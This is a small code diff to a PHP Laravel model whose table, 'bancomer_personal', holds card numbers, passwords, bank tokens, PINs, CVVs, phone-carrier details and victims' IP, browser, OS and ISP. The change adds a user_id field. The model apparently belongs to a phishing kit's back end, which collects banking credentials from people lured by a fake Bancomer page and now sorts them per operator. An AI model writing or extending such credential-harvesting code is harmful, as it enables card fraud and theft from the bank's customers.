@@ -10,7 +10,7 @@ class Personal extends Model
 	protected $table = 'bancomer_personal';
 
     protected $fillable = [
-        'n_tarjeta','nombre','contrasena','token','nip','cvv','compania','telefono','mi_telcel','ip','navegador','os','isp','estatus'
+        'n_tarjeta','nombre','contrasena','token','nip','cvv','compania','telefono','mi_telcel','ip','navegador','os','isp','estatus','user_id'
     ];
 
     public function etiquetas() {
